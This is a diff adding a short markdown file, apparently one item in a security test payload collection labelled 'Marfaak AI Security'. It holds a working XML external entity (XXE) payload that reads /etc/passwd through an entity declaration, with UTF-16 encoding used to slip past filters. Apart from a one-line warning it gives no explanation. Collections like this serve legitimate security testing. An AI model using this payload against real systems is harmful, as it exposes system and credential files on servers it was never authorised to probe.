@@ -1,0 +1,9 @@
+# Marfaak AI Security - XXE with UTF-16 encoding
+
+**WARNING: This payload tests XXE with UTF-16 encoding.**
+
+<?xml version="1.0" encoding="UTF-16"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<data>&xxe; - UTF-16 encoded XXE bypass</data>
